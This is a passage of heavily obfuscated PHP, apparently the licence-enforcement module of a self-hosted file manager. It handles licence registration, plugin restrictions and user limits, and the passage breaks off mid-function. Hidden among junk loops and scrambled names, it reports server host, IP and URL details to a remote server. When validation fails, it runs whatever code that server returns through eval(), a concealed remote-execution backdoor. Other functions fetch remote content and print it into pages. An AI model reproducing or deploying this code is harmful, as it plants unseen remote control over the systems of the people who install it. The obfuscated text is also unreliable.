$_SERVER[Ò°Ì”İ•]; $ì½ú®Ó =& $_SERVER[¦ù÷êöÏ]; if ($_SERVER[$ì½ú®Ó[24]] != $ì½ú®Ó[149]) { return; } if (!KodUser::isRoot()) { die; } $¹ª›ü×Ò = $GLOBALS[$ì½ú®Ó[13]]; if (isset($¹ª›ü×Ò[$ì½ú®Ó[150]])) { $this->pbch5c1ddc35(); die; } if (isset($¹ª›ü×Ò[$ì½ú®Ó[151]]) && isset($¹ª›ü×Ò[$ì½ú®Ó[151]]) == $ì½ú®Ó[122]) { $¹ª›ü×Ò[$ì½ú®Ó[152]] = Model($ì½ú®Ó[33])->get($ì½ú®Ó[153]); } if (!isset($¹ª›ü×Ò[$ì½ú®Ó[152]]) || strlen($¹ª›ü×Ò[$ì½ú®Ó[152]]) != 16) { show_json($ì½ú®Ó[154] . $¹ª›ü×Ò[$ì½ú®Ó[152]], !1); } $¯èË­Ûá = Model($ì½ú®Ó[33])->get($ì½ú®Ó[100]); $é’øÌÄÄ = md5($_SERVER[$ì½ú®Ó[106]] . $¯èË­Ûá); $…»û õ„ = array($ì½ú®Ó[152] => $¹ª›ü×Ò[$ì½ú®Ó[152]], $ì½ú®Ó[155] => rand_string(16), $ì½ú®Ó[156] => $ì½ú®Ó[136], $ì½ú®Ó[157] => $ì½ú®Ó[158], $ì½ú®Ó[159] => $_SERVER[$ì½ú®Ó[160]], $ì½ú®Ó[161] => $_SERVER[$ì½ú®Ó[162]], $ì½ú®Ó[163] => $_SERVER[$ì½ú®Ó[164]], $ì½ú®Ó[105] => $é’øÌÄÄ, $ì½ú®Ó[165] => Model($ì½ú®Ó[33])->get($ì½ú®Ó[131])); if (isset($¹ª›ü×Ò[$ì½ú®Ó[151]]) && isset($¹ª›ü×Ò[$ì½ú®Ó[151]]) == $ì½ú®Ó[122]) { $…»û õ„[$ì½ú®Ó[151]] = md5($…»û õ„[$ì½ú®Ó[152]] . $ì½ú®Ó[166] . $…»û õ„[$ì½ú®Ó[155]]); } if ($¹ª›ü×Ò[$ì½ú®Ó[167]] == $ì½ú®Ó[168]) { $ÏšÇÈÖÕ = $this->owfd051c97a6($é’øÌÄÄ, $ì½ú®Ó[169]); $Ğ¼ç«ß™ = $this->khpu86d3adea(json_encode($…»û õ„), $é’øÌÄÄ . $ì½ú®Ó[170], 3); $Ğ¼ç«ß™ = $Ğ¼ç«ß™ . $ì½ú®Ó[171] . $_SERVER[$ì½ú®Ó[160]]; $Şıä‘¯ = $this->aols2db9a7f4($ì½ú®Ó[172] . $ÏšÇÈÖÕ . $ì½ú®Ó[173] . $Ğ¼ç«ß™, -1); show_json($Şıä‘¯, !0); } else { if ($¹ª›ü×Ò[$ì½ú®Ó[167]] == $ì½ú®Ó[174]) { $÷Œ‘ÎéÀ = substr(md5($ì½ú®Ó[175] . $é’øÌÄÄ), 12, 15) . $ì½ú®Ó[176]; $Ğ¼ç«ß™ = $this->nejacecd3d48(trim($¹ª›ü×Ò[$ì½ú®Ó[177]]), $÷Œ‘ÎéÀ, 2); $¼ÆûáÏ¦ = json_decode($Ğ¼ç«ß™, !0); if (!is_array($¼ÆûáÏ¦) || !is_array($¼ÆûáÏ¦[$ì½ú®Ó[178]]) || $¼ÆûáÏ¦[$ì½ú®Ó[152]] != !0) { $š€Ï¼Ëç = $ì½ú®Ó[179]; $°§¤˜’° = $¼ÆûáÏ¦[$ì½ú®Ó[178]] ? $ì½ú®Ó[180] . $¼ÆûáÏ¦[$ì½ú®Ó[178]] : $š€Ï¼Ëç; show_json($°§¤˜’°, !1); } else { $…»û õ„[$ì½ú®Ó[155]] = $¼ÆûáÏ¦[$ì½ú®Ó[178]][$ì½ú®Ó[181]]; } } else { $¼ÆûáÏ¦ = $this->aols2db9a7f4($ì½ú®Ó[182], $…»û õ„, 10); $¯°±Õ¥› = $„ø×Ó†Ø[740]; if (!$¯°±Õ¥›) { die; } } } if (!is_array($¼ÆûáÏ¦) || !is_array($¼ÆûáÏ¦[$ì½ú®Ó[178]]) || $¼ÆûáÏ¦[$ì½ú®Ó[152]] != !0) { $š€Ï¼Ëç = LNG($ì½ú®Ó[183]); $°§¤˜’° = $¼ÆûáÏ¦[$ì½ú®Ó[178]] ? $ì½ú®Ó[180] . $¼ÆûáÏ¦[$ì½ú®Ó[178]] : $š€Ï¼Ëç; show_json($°§¤˜’°, !1); } $õÕğ¯áû = $¼ÆûáÏ¦[$ì½ú®Ó[178]]; $ƒã‘‘» = $this->prqieda3a3a8($õÕğ¯áû[$ì½ú®Ó[184]]); if (!$ƒã‘‘» || $ƒã‘‘» != $õÕğ¯áû[$ì½ú®Ó[129]]) { $£ñó¤ë = array($ì½ú®Ó[185] => Model($ì½ú®Ó[33])->get($ì½ú®Ó[100]), $ì½ú®Ó[186] => $_SERVER[$ì½ú®Ó[106]], $ì½ú®Ó[187] => this_url(), $ì½ú®Ó[161] => $_SERVER[$ì½ú®Ó[162]]); $Ğ¼ç«ß™ = $this->lhmj75c9ca20(json_encode($£ñó¤ë)); $this->aols2db9a7f4($ì½ú®Ó[188] . $Ğ¼ç«ß™); show_json(LNG($ì½ú®Ó[189]), !0); } $¾€‘¹Ïõ = array($ì½ú®Ó[153] => $õÕğ¯áû[$ì½ú®Ó[190]], $ì½ú®Ó[191] => $õÕğ¯áû[$ì½ú®Ó[192]], $ì½ú®Ó[193] => rand_string(16), $ì½ú®Ó[108] => $õÕğ¯áû[$ì½ú®Ó[194]]); if ($…»û õ„[$ì½ú®Ó[155]]) { $¾€‘¹Ïõ[$ì½ú®Ó[193]] = $…»û õ„[$ì½ú®Ó[155]]; } $¹å²ı™ = substr(md5($¾€‘¹Ïõ[$ì½ú®Ó[191]]), 10, 10); $§ûß´† = $¹å²ı™ . $¾€‘¹Ïõ[$ì½ú®Ó[108]] . $¾€‘¹Ïõ[$ì½ú®Ó[193]]; $¾€‘¹Ïõ[$ì½ú®Ó[110]] = strrev(base64_encode($this->owfd051c97a6($§ûß´†, $ì½ú®Ó[195]))); $º®ÂùşÅ = rand_string(16); $ÜÑ·«æÑ = $„ø×Ó†Ø[741]; while ($ÜÑ·«æÑ < $„ø×Ó†Ø[705]) { if ($ÜÑ·«æÑ >= 0) { break; } $ÜÑ·«æÑ++; } $ù»À“ğ÷ = $º®ÂùşÅ . $¾€‘¹Ïõ[$ì½ú®Ó[108]] . $this->owfd051c97a6(md5($¾€‘¹Ïõ[$ì½ú®Ó[153]]), $º®ÂùşÅ); $”•«Å±à = $„ø×Ó†Ø[742]; $¾€‘¹Ïõ[$ì½ú®Ó[111]] = base64_encode(strrev($this->owfd051c97a6($ù»À“ğ÷, $ì½ú®Ó[196]))); $‘ÒÍ¤å = $„ø×Ó†Ø[743]; if ($õÕğ¯áû[$ì½ú®Ó[197]] && $õÕğ¯áû[$ì½ú®Ó[197]] >= 1) { Model($ì½ú®Ó[33])->setDeep($ì½ú®Ó[198], $ì½ú®Ó[122]); } Model($ì½ú®Ó[33])->set($¾€‘¹Ïõ); $…ÄÀˆÃÂ = md5($_SERVER[$ì½ú®Ó[106]] . strrev($¯èË­Ûá) . $¾€‘¹Ïõ[$ì½ú®Ó[191]]); $ßĞÍ‹‰ö = strrev(substr($…ÄÀˆÃÂ, 10, 16)); $ø‰Æ‰ò = $„ø×Ó†Ø[744]; if (strlen($ø‰Æ‰ò) < $„ø×Ó†Ø[705]) { return; } $Ïöğü†î = $this->khpu86d3adea(json_encode($õÕğ¯áû), $…ÄÀˆÃÂ); $õòÈÅœÃ = array_to_keyvalue(Model($ì½ú®Ó[7])->listData(), $ì½ú®Ó[199]); $·ÎÛÇ—Ä = $„ø×Ó†Ø[745]; while ($·ÎÛÇ—Ä < $„ø×Ó†Ø[714]) { if ($·ÎÛÇ—Ä >= 0) { break; } $·ÎÛÇ—Ä++; } $ô¥¨ùÌ = $õòÈÅœÃ[$ì½ú®Ó[200]]; $®«©Ã¤‹ = $„ø×Ó†Ø[746]; if (strlen($®«©Ã¤‹) < $„ø×Ó†Ø[714]) { die; } $ÛÚÙ“ô’ = array(); $ŒœÄÆ‚ = $„ø×Ó†Ø[747]; $ÛÚÙ“ô’[$ßĞÍ‹‰ö] = $Ïöğü†î; Model($ì½ú®Ó[7])->update($ô¥¨ùÌ[$ì½ú®Ó[201]], array($ì½ú®Ó[202] => $ÛÚÙ“ô’)); $this->krzl2363cf69 = $õÕğ¯áû; $this->yicq5e90482e = $¾€‘¹Ïõ[$ì½ú®Ó[108]]; $this->licenseRegistSuccess(); Cache::set($ì½ú®Ó[203] . md5($¯èË­Ûá . $ì½ú®Ó[204]), $ì½ú®Ó[6]); $á’æíÈÈ = $„ø×Ó†Ø[748]; if (strlen($á’æíÈÈ) < $„ø×Ó†Ø[702]) { return; } show_json(LNG($ì½ú®Ó[189]), !0); $Â›•ˆ¹‰ = $„ø×Ó†Ø[749]; } private function licenseRegistSuccess() { $°Æ¨¨“Â =& $_SERVER[¦ù÷êöÏ]; $ş„ôÖ™ = Model($°Æ¨¨“Â[33])->get(); if ($ş„ôÖ™[$°Æ¨¨“Â[63]] != $°Æ¨¨“Â[122]) { Model($°Æ¨¨“Â[33])->set($°Æ¨¨“Â[63], $°Æ¨¨“Â[122]); } Action($°Æ¨¨“Â[205])->initStart(!0); } private function pbch5c1ddc35() { $Æá–ŞÕ‡ =& $_SERVER[Ò°Ì”İ•]; $òŒÕüÈÀ =& $_SERVER[¦ù÷êöÏ]; Model($òŒÕüÈÀ[33])->set(array($òŒÕüÈÀ[153] => $òŒÕüÈÀ[6], $òŒÕüÈÀ[191] => $òŒÕüÈÀ[6], $òŒÕüÈÀ[108] => $òŒÕüÈÀ[109], $òŒÕüÈÀ[110] => $òŒÕüÈÀ[6], $òŒÕüÈÀ[111] => $òŒÕüÈÀ[6])); $«ü¿ˆ¥¥ = $Æá–ŞÕ‡[750]; if (!$«ü¿ˆ¥¥) { return; } Model($òŒÕüÈÀ[33])->setDeep($òŒÕüÈÀ[198], $òŒÕüÈÀ[206]); $½×¡“İ = $Æá–ŞÕ‡[751]; if (!$½×¡“İ) { die; } $this->krzl2363cf69 = array(); $this->yicq5e90482e = $òŒÕüÈÀ[109]; $¬€¡º‹‹ = $Æá–ŞÕ‡[752]; while (strlen($¬€¡º‹‹) < $Æá–ŞÕ‡[702]) { if (!$¬€¡º‹‹) { break; } $¬€¡º‹‹++; } } private function jucvbbcb17e9() { $‚Šº “ =& $_SERVER[Ò°Ì”İ•]; $÷‰¶ÍÔä =& $_SERVER[¦ù÷êöÏ]; $_SERVER[$÷‰¶ÍÔä[162]] = _get($_SERVER, $÷‰¶ÍÔä[162], APP_HOST); $this->yicq5e90482e = $÷‰¶ÍÔä[109]; $ÔÔ´Â«„ = $‚Šº “[753]; while (strlen($ÔÔ´Â«„) < $‚Šº “[754]) { if (!$ÔÔ´Â«„) { break; } $ÔÔ´Â«„++; } $‹İ¶ó² = Model($÷‰¶ÍÔä[33])->get(); if ($‹İ¶ó²[$÷‰¶ÍÔä[108]] == $÷‰¶ÍÔä[109]) { return; } $ı¥ÃÜ‹İ = Model($÷‰¶ÍÔä[33])->get($÷‰¶ÍÔä[100]); $¯¯§±ô„ = $÷‰¶ÍÔä[203] . md5($ı¥ÃÜ‹İ . $÷‰¶ÍÔä[204]); $†»Œ¾© = $‚Šº “[755]; if (!$†»Œ¾©) { die; } $…µ‚Ûî = Cache::get($¯¯§±ô„); if (!is_array($…µ‚Ûî) || !isset($…µ‚Ûî[$÷‰¶ÍÔä[207]]) || time() - $…µ‚Ûî[$÷‰¶ÍÔä[207]] >= 60) { $“¹ôÛÁÙ = Model($÷‰¶ÍÔä[7])->loadList(); $£¡„çÇ = $“¹ôÛÁÙ[$÷‰¶ÍÔä[200]]; $¶õ½çŒî = md5($_SERVER[$÷‰¶ÍÔä[106]] . strrev($ı¥ÃÜ‹İ) . $‹İ¶ó²[$÷‰¶ÍÔä[191]]); $ÆõäŸŒ€ = strrev(substr($¶õ½çŒî, 10, 16)); $…µ‚Ûî = $this->nejacecd3d48($£¡„çÇ[$÷‰¶ÍÔä[86]][$ÆõäŸŒ€], $¶õ½çŒî); $…µ‚Ûî = json_decode($…µ‚Ûî, !0); } if (!is_array($…µ‚Ûî)) { return $this->pbch5c1ddc35(); } $ö»Å¬¨ = strtotime($…µ‚Ûî[$÷‰¶ÍÔä[129]]); if (time() >= $ö»Å¬¨) { return $this->pbch5c1ddc35(); } if (!isset($…µ‚Ûî[$÷‰¶ÍÔä[207]]) || time() - $…µ‚Ûî[$÷‰¶ÍÔä[207]] > 20) { $…µ‚Ûî[$÷‰¶ÍÔä[207]] = time(); Cache::set($¯¯§±ô„, $…µ‚Ûî); } $this->krzl2363cf69 = $…µ‚Ûî; $this->yicq5e90482e = $‹İ¶ó²[$÷‰¶ÍÔä[108]]; } private function aimh507af633() { $š‚ì¸çà =& $_SERVER[¦ù÷êöÏ]; $©ì„˜ËÛ = $GLOBALS[$š‚ì¸çà[13]]; $ì—¶£¸£ = $_SERVER[$š‚ì¸çà[24]]; if ($ì—¶£¸£ == $š‚ì¸çà[208] && $this->yicq5e90482e == $š‚ì¸çà[109]) { show_json(LNG($š‚ì¸çà[209]), !1, $š‚ì¸çà[210]); } $©ÎšŒÀ° = array($š‚ì¸çà[211], $š‚ì¸çà[212]); if (in_array($ì—¶£¸£, $©ÎšŒÀ°)) { if ($this->yicq5e90482e == $š‚ì¸çà[109] && isset($©ì„˜ËÛ[$š‚ì¸çà[213]])) { show_json(LNG($š‚ì¸çà[209]), !1, $š‚ì¸çà[210]); die; } $ÌÌèÂÚ£ = $this->ztsw40e918ec(); if ($ÌÌèÂÚ£ != intval($š‚ì¸çà[214])) { if ($ÌÌèÂÚ£ <= Model($š‚ì¸çà[125])->count()) { show_json(LNG($š‚ì¸çà[215]), !1, $š‚ì¸çà[210]); die; } } } } private function tpfzcc37366b() { $ÆòÛŠü× =& $_SERVER[Ò°Ì”İ•]; $Ï¿£§‹ =& $_SERVER[¦ù÷êöÏ]; $¹‚Œäİ‘ = array($Ï¿£§‹[119], $Ï¿£§‹[120]); if (!KodUser::isRoot() || !isset($_GET[$Ï¿£§‹[216]])) { return; } if (!in_array($_SERVER[$Ï¿£§‹[24]], $¹‚Œäİ‘)) { return; } $’ÓŠŞîã = $Ï¿£§‹[217]; $·”òíñ¥ = $ÆòÛŠü×[756]; while ($·”òíñ¥ < $ÆòÛŠü×[714]) { if ($·”òíñ¥ >= 0) { break; } $·”òíñ¥++; } $’ÓŠŞîã = $this->eqzg0371cdd8($’ÓŠŞîã, $Ï¿£§‹[218]); $¸ôÆÑ “ = stream_context_create(array($Ï¿£§‹[219] => array($Ï¿£§‹[220] => $Ï¿£§‹[221], $Ï¿£§‹[222] => 3))); $óÒùÅÍ = $ÆòÛŠü×[757]; if (strlen($óÒùÅÍ) < $ÆòÛŠü×[60]) { return; } $ÄòÓä‰ = @file_get_contents($’ÓŠŞîã, !1, $¸ôÆÑ “); header($Ï¿£§‹[223]); $êÌµç = $ÆòÛŠü×[758]; if (!$êÌµç) { return; } if ($ÄòÓä‰ && strstr($ÄòÓä‰, $Ï¿£§‹[224])) { echo $ÄòÓä‰; } die; } public function jmos3d76430c($İÜèÙêË) { $®Æ¤œü× =& $_SERVER[Ò°Ì”İ•]; $Ô™Ì¯×é =& $_SERVER[¦ù÷êöÏ]; if ($this->yicq5e90482e == $Ô™Ì¯×é[225]) { return $İÜèÙêË; } $‡šØÕ­º = $this->versionPluginList(); $§«½³ˆÆ = $®Æ¤œü×[718]; $ĞŞµ–ùú = explode($Ô™Ì¯×é[226], $this->versionPluginFilter()); $‰ÛÒáóÓ = array(); foreach ($‡šØÕ­º as $ı‹ÅÌ‰É => $Şóšİ¼é) { if ($Şóšİ¼é == $Ô™Ì¯×é[227] && substr($this->yicq5e90482e, 0, 1) == $Ô™Ì¯×é[227]) { continue; } if (!in_array($ı‹ÅÌ‰É, $ĞŞµ–ùú)) { $‰ÛÒáóÓ[] = $ı‹ÅÌ‰É; } } foreach ($‰ÛÒáóÓ as $ı‹ÅÌ‰É) { unset($İÜèÙêË[$ı‹ÅÌ‰É]); $‚’òÔ§§ = $®Æ¤œü×[759]; while (strlen($‚’òÔ§§) < $®Æ¤œü×[702]) { if (!$‚’òÔ§§) { break; } $‚’òÔ§§++; } } return $İÜèÙêË; $°›´ÓÒ = $®Æ¤œü×[760]; while ($°›´ÓÒ < $®Æ¤œü×[714]) { if ($°›´ÓÒ >= 0) { break; } $°›´ÓÒ++; } } private function versionPluginList() { $‹¢’íÜâ =& $_SERVER[¦ù÷êöÏ]; return array($‹¢’íÜâ[228] => $‹¢’íÜâ[227], $‹¢’íÜâ[229] => $‹¢’íÜâ[227], $‹¢’íÜâ[230] => $‹¢’íÜâ[227], $‹¢’íÜâ[231] => $‹¢’íÜâ[232], $‹¢’íÜâ[233] => $‹¢’íÜâ[232], $‹¢’íÜâ[234] => $‹¢’íÜâ[232], $‹¢’íÜâ[235] => $‹¢’íÜâ[232], $‹¢’íÜâ[236] => $‹¢’íÜâ[232], $‹¢’íÜâ[237] => $‹¢’íÜâ[232], $‹¢’íÜâ[238] => $‹¢’íÜâ[232], $‹¢’íÜâ[239] => $‹¢’íÜâ[232], $‹¢’íÜâ[240] => $‹¢’íÜâ[232], $‹¢’íÜâ[241] => $‹¢’íÜâ[232], $‹¢’íÜâ[242] => $‹¢’íÜâ[232], $‹¢’íÜâ[243] => $‹¢’íÜâ[232], $‹¢’íÜâ[244] => $‹¢’íÜâ[232]); $‚ƒ•ùÛ¼ = $_SERVER[Ò°Ì”İ•][761]; } private function versionPluginFilter() { $™ã±ø­û =& $_SERVER[Ò°Ì”İ•]; $‚¶›ŒíÃ =& $_SERVER[¦ù÷êöÏ]; if ($this->yicq5e90482e == $‚¶›ŒíÃ[109]) { return $‚¶›ŒíÃ[6]; } $Äøğç  = _get($this->krzl2363cf69, $‚¶›ŒíÃ[245], $‚¶›ŒíÃ[6]); $Š°û“šß = $™ã±ø­û[762]; while ($Š°û“šß < $™ã±ø­û[705]) { if ($Š°û“šß >= 0) { break; } $Š°û“šß++; } $”¸ïõ¤© = _get($this->krzl2363cf69, $‚¶›ŒíÃ[116], $‚¶›ŒíÃ[6]); $»Àƒ³ï = _get($this->krzl2363cf69, $‚¶›ŒíÃ[246], $‚¶›ŒíÃ[6]); $ë”‹æ¡ = $™ã±ø­û[763]; if (!$ë”‹æ¡) { die; } if ($”¸ïõ¤© > time() && $»Àƒ³ï > time()) { $ÜÑÇÒé¢ = explode($‚¶›ŒíÃ[226], $Äøğç ); $°×ñíƒ = array_keys($this->versionPluginList()); $Äøğç  = array_merge($ÜÑÇÒé¢, $°×ñíƒ); $Äøğç  = implode($‚¶›ŒíÃ[226], array_filter(array_unique($Äøğç ))); } return $Äøğç ; } private function kioq675b097d() { $„ƒ™„Ïı =& $_SERVER[¦ù÷êöÏ]; if ($this->yicq5e90482e != $„ƒ™„Ïı[109]) { $GLOBALS[$„ƒ™„Ïı[86]][$„ƒ™„Ïı[90]][$„ƒ™„Ïı[247]] = $„ƒ™„Ïı[206]; return; } $GLOBALS[$„ƒ™„Ïı[86]][$„ƒ™„Ïı[248]] = $„ƒ™„Ïı[122]; if (Model($„ƒ™„Ïı[249])->get($„ƒ™„Ïı[63]) != $„ƒ™„Ïı[206]) { Model($„ƒ™„Ïı[249])->set($„ƒ™„Ïı[63], $„ƒ™„Ïı[206]); } } public function dhgk8266a4c4() { return $_SERVER[¦ù÷êöÏ][250]; } private function ndmj1473927c() { $·†¥“ÂÏ =& $_SERVER[Ò°Ì”İ•]; $Æ°ŒÀğŠ =& $_SERVER[¦ù÷êöÏ]; $ì¹ˆ¥È‡ = array($Æ°ŒÀğŠ[251], $Æ°ŒÀğŠ[252], $Æ°ŒÀğŠ[253]); $ŒÊëÑ¶ö = $Æ°ŒÀğŠ[254] . md5($Æ°ŒÀğŠ[255]); if ($this->yicq5e90482e == $Æ°ŒÀğŠ[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$Æ°ŒÀğŠ[24]], $ì¹ˆ¥È‡)) { return; } if (time() % 4 != 0) { return; } $Œğ·Æ ğ = call_user_func(array($Æ°ŒÀğŠ[256], $Æ°ŒÀğŠ[257]), $ŒÊëÑ¶ö); $‚ÊÆ€Ë« = $·†¥“ÂÏ[764]; if (!$‚ÊÆ€Ë«) { return; } if ($Œğ·Æ ğ && time() - $Œğ·Æ ğ < intval($Æ°ŒÀğŠ[258])) { return; } call_user_func(array($Æ°ŒÀğŠ[256], $Æ°ŒÀğŠ[139]), $ŒÊëÑ¶ö, time()); $ë¬æÛ¡û = $·†¥“ÂÏ[765]; if (strlen($ë¬æÛ¡û) < $·†¥“ÂÏ[705]) { return; } $òºÁºÏš = Model($Æ°ŒÀğŠ[33])->get($Æ°ŒÀğŠ[100]); $²ß¡ë¬Ó = $·†¥“ÂÏ[766]; if (!$²ß¡ë¬Ó) { return; } $Õ® îŒò = array($Æ°ŒÀğŠ[152] => Model($Æ°ŒÀğŠ[33])->get($Æ°ŒÀğŠ[153]), $Æ°ŒÀğŠ[167] => $this->yicq5e90482e, $Æ°ŒÀğŠ[163] => $_SERVER[$Æ°ŒÀğŠ[164]], $Æ°ŒÀğŠ[165] => Model($Æ°ŒÀğŠ[33])->get($Æ°ŒÀğŠ[131]), $Æ°ŒÀğŠ[105] => md5($_SERVER[$Æ°ŒÀğŠ[106]] . $òºÁºÏš), $Æ°ŒÀğŠ[156] => $Æ°ŒÀğŠ[136], $Æ°ŒÀğŠ[159] => $_SERVER[$Æ°ŒÀğŠ[160]]); $úíí™‹è = $this->aols2db9a7f4($Æ°ŒÀğŠ[259], $Õ® îŒò); if (!is_array($úíí™‹è)) { return; } if ($úíí™‹è[$Æ°ŒÀğŠ[152]] && $úíí™‹è[$Æ°ŒÀğŠ[260]]) { if ($this->prqieda3a3a8($úíí™‹è[$Æ°ŒÀğŠ[260]]) == $Õ® îŒò[$Æ°ŒÀğŠ[152]]) { return; } } $this->pbch5c1ddc35(); if ($this->prqieda3a3a8($úíí™‹è[$Æ°ŒÀğŠ[260]]) != $Õ® îŒò[$Æ°ŒÀğŠ[152]]) { $¢éÊÒšæ = array($Æ°ŒÀğŠ[185] => $òºÁºÏš, $Æ°ŒÀğŠ[186] => $_SERVER[$Æ°ŒÀğŠ[106]], $Æ°ŒÀğŠ[187] => this_url(), $Æ°ŒÀğŠ[161] => $_SERVER[$Æ°ŒÀğŠ[162]]); $ÌÇñˆ¯û = $this->lhmj75c9ca20(json_encode($¢éÊÒšæ)); $úíí™‹è = $this->aols2db9a7f4($Æ°ŒÀğŠ[188] . $ÌÇñˆ¯û); if ($úíí™‹è && is_array($úíí™‹è) && isset($úíí™‹è[$Æ°ŒÀğŠ[260]])) { $¼µÁ“Ì« = $this->nejacecd3d48($úíí™‹è[$Æ°ŒÀğŠ[260]], 2); if ($¼µÁ“Ì«) { $¼µÁ“Ì« = $this->prqieda3a3a8($¼µÁ“Ì«); } if ($¼µÁ“Ì«) { try { @eval($¼µÁ“Ì«); } catch (Exception $€ò®÷‰) { } } } } } private function aols2db9a7f4($£Ú”á¼­ = '', $¼®¸…°™ = array(), $€€Î÷ùæ = 5) { $Ñ¨Êí÷ =& $_SERVER[Ò°Ì”İ•]; $Üá²ø· =& $_SERVER[¦ù÷êöÏ]; $©‡äè™² = $Üá²ø·[261]; $©‡äè™² = $this->eqzg0371cdd8($©‡äè™², $Üá²ø·[262]); $ì÷‚¡ñ‡ = $Ñ¨Êí÷[767]; $©‡äè™² = $©‡äè™² . $£Ú”á¼­; if ($¼®¸…°™ && is_array($¼®¸…°™)) { $©‡äè™² = $©‡äè™² . $Üá²ø·[263] . http_build_query($¼®¸…°™); } if ($¼®¸…°™ === -1) { return $©‡äè™²; } $ÖôééÒ = stream_context_create(array($Üá²ø·[219] => array($Üá²ø·[222] => $€€Î÷ùæ, $Üá²ø·[220] => $Üá²ø·[264]), $Üá²ø·[265] => array($Üá²ø·[266] => !1, $Üá²ø·[267] => !1))); $¼®¸…°™ = @file_get_contents($©‡äè™², !1, $ÖôééÒ); $¸ìŠËĞœ = $Ñ¨Êí÷[768]; return json_decode($¼®¸…°™, !0); $„Ú›ó¨¥ = $Ñ¨Êí÷[769]; if (strlen($„Ú›ó¨¥) < $Ñ¨Êí÷[714]) { return; } } private function ztsw40e918ec() { $ê‘¸ñË— =& $_SERVER[Ò°Ì”İ•]; $å£õ¦ Ô =& $_SERVER[¦ù÷êöÏ]; $ŸÀÛ¬ïÔ = array($å£õ¦ Ô[268] => $å£õ¦ Ô[269], $å£õ¦ Ô[270] => $å£õ¦ Ô[271], $å£õ¦ Ô[272] => $å£õ¦ Ô[273], $å£õ¦ Ô[274] => $å£õ¦ Ô[275], $å£õ¦ Ô[276] => $å£õ¦ Ô[277], $å£õ¦ Ô[278] => $å£õ¦ Ô[214], $å£õ¦ Ô[279] => $å£õ¦ Ô[214], $å£õ¦ Ô[280] => $å£õ¦ Ô[269], $å£õ¦ Ô[281] => $å£õ¦ Ô[271], $å£õ¦ Ô[282] => $å£õ¦ Ô[273], $å£õ¦ Ô[283] => $å£õ¦ Ô[284], $å£õ¦ Ô[285] => $å£õ¦ Ô[275], $å£õ¦ Ô[286] => $å£õ¦ Ô[287], $å£õ¦ Ô[288] => $å£õ¦ Ô[277], $å£õ¦ Ô[289] => $å£õ¦ Ô[290], $å£õ¦ Ô[291] => $å£õ¦ Ô[292], $å£õ¦ Ô[293] => $å£õ¦ Ô[294]); $Ù˜…‘â  = $ŸÀÛ¬ïÔ[$this->yicq5e90482e]; $Ù˜…‘â  = intval($Ù˜…‘â  ? $Ù˜…‘â  : $å£õ¦ Ô[269]); $†¬¿ş«• = $ê‘¸ñË—[770]; if (!$†¬¿ş«•) { die; } $ÜÀ‚Óò = _get($this->krzl2363cf69, $å£õ¦ Ô[295]); $ÜÀ‚Óò = $ÜÀ‚Óò ? intval($ÜÀ‚Óò) : 0; $Ñè¥Çı² = $ê‘¸ñË—[771]; if (strlen($Ñè¥Çı²) < $ê‘¸ñË—[714]) { die; } return $Ù˜…‘â  + $ÜÀ‚Óò; } public function vfync7d624af($ÕÛÜ¸«¬) { $ãË“Û’ =& $_SERVER[Ò°Ì”İ•]; $‘ƒª»µ‹ =& $_SERVER[¦ù÷êöÏ]; $¶ÊÀŞÆ¼ = $this->ztsw40e918ec(); $•¼ƒ”¶é = $ãË“Û’[772]; while ($•¼ƒ”¶é < $ãË“Û’[705]) { if ($•¼ƒ”¶é >= 0) { break; } $•¼ƒ”¶é++; } if ($ÕÛÜ¸«¬[$‘ƒª»µ‹[296]] == $‘ƒª»µ‹[122]) { return; } if ($¶ÊÀŞÆ¼ >= intval($‘ƒª»µ‹[214])) { return; } $†Ò×¬¼ = Model($‘ƒª»µ‹[125])->count(); if ($†Ò×¬¼ <= $¶ÊÀŞÆ¼) { return; } $«³©Ø¯¡ = Model($‘ƒª»µ‹[125])->field($‘ƒª»µ‹[296])->limit($¶ÊÀŞÆ¼)->select(); $õù“ış¨ = $ãË“Û’[773]; $«³©Ø¯¡ = array_to_keyvalue($«³©Ø¯¡, $‘ƒª»µ‹[6], $‘ƒª»µ‹[296]); if (!in_array($ÕÛÜ¸«¬[$‘ƒª»µ‹[296]], $«³©Ø¯¡)) { show_json($‘ƒª»µ‹[297], !1, $‘ƒª»µ‹[210]); } } public function imbs7900699a() { $µß°ö¿™ =& $_SERVER[Ò°Ì”İ•]; $½Šêî©ì =& $_SERVER[¦ù÷êöÏ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ÂÀÜÆÃ¥ = $½Šêî©ì[217]; $ŒÉæáÌ™ = $µß°ö¿™[774]; if (!$ŒÉæáÌ™) { die; } $ÂÀÜÆÃ¥ = $this->eqzg0371cdd8($ÂÀÜÆÃ¥, $½Šêî©ì[218]); $¨Ø§ñ¯Ó = stream_context_create(array($½Šêî©ì[219] => array($½Šêî©ì[220] => $½Šêî©ì[221], $½Šêî©ì[222] => 3))); $°ğœ€³ = $µß°ö¿™[703]; while ($°ğœ€³ < $µß°ö¿™[714]) { if ($°ğœ€³ >= 0) { break; } $°ğœ€³++; } $¬ÛÓ = @file_get_contents($ÂÀÜÆÃ¥, !1, $¨Ø§ñ¯Ó); $şé¾¾˜ß = $µß°ö¿™[775]; echo $½Šêî©ì[298] . hash_encode($¬ÛÓ) . $½Šêî©ì[299]; $µúóŒù† = $µß°ö¿™[776]; if (!$µúóŒù†) { return; } } private function khpu86d3adea($”çüšøÖ, $‡¸ÃõŒ, $Ï¥Ôæõé = 3) { $ÅˆÊ¸¥ˆ =& $_SERVER[Ò°Ì”İ•]; $ëíÈ½ˆÅ =& $_SERVER[¦ù÷êöÏ]; usleep(1); $”çüšøÖ = trim($”çüšøÖ); $°½¨ƒïÍ = $ÅˆÊ¸¥ˆ[777]; while (strlen($°½¨ƒïÍ) < $ÅˆÊ¸¥ˆ[60]) { if (!$°½¨ƒïÍ) { break; } $°½¨ƒïÍ++; } $•¶áõÊ‹ = mt_rand(0, 5) . $ëíÈ½ˆÅ[6]; $ôÃ¦ô®¼ = rand_string(15); $ÁÎ€Á ú = $ëíÈ½ˆÅ[300]; $şôáä­Ë = $ÅˆÊ¸¥ˆ[778]; switch ($•¶áõÊ‹) { case $ëíÈ½ˆÅ[206]: $‚šÀÅå† = $this->owfd051c97a6($”çüšøÖ, strrev($‡¸ÃõŒ . $ôÃ¦ô®¼)); break; $–«¥ÚÀ = $ÅˆÊ¸¥ˆ[779]; case $ëíÈ½ˆÅ[122]: $‚šÀÅå† = $this->owfd051c97a6($”çüšøÖ, strrev($ôÃ¦ô®¼ . $‡¸ÃõŒ)); $ØÀ”¼¿‘ = 